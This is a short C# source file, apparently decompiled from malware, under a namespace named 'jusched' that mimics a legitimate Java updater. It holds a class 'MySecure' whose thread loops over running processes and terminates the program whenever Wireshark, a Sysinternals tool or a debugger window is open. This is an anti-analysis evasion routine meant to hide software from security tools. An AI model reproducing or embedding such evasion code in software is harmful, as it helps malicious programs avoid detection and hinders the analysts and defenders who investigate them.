using System;
using System.Diagnostics;
using System.Threading;

namespace jusched;

public class MySecure
{
	public static Thread ant_0 = new Thread(shark);

	[DebuggerNonUserCode]
	public MySecure()
	{
	}

	private static void shark()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				string mainWindowTitle = process.MainWindowTitle;
				if (string.Equals(mainWindowTitle, "The Wireshark Network Analyzer"))
				{
					Environment.Exit(Environment.ExitCode);
				}
				else if (mainWindowTitle.Contains("Sysinternals"))
				{
					Environment.Exit(Environment.ExitCode);
				}
				else if (mainWindowTitle.Contains("Debugger"))
				{
					Environment.Exit(Environment.ExitCode);
				}
			}
		}
	}
}
